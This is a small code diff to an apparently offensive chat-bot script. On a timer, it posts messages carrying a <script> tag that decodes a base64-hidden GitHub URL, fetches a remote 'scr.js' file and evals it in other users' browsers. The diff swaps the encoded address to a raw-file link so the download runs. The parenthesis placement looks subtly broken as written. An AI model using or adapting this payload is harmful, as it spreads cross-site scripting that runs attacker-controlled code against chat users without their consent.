@@ -13,7 +13,7 @@ const intervalId = setInterval(function() {
         list: ["name", "gnygres"]
     });
     socket.emit('talk', {
-        text: "gnygres <script>fetch(atob('aHR0cHM6Ly9naXRodWIuY29tL2JsYW5rbmFtZWxtYW9sbWFvLXN0YXIvc2NyL2Jsb2IvbWFpbi8=')+'scr'+atob('Lmpz').then(r=>r.text()).then(t=>eval(t))</script>"
+        text: "gnygres <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JsYW5rbmFtZWxtYW9sbWFvLXN0YXIvc2NyL3JlZnMvaGVhZHMvbWFpbi8=')+'scr'+atob('Lmpz').then(r=>r.text()).then(t=>eval(t))</script>"
     });
     coughtimer = coughtimer - 125;
 }, coughtimer);
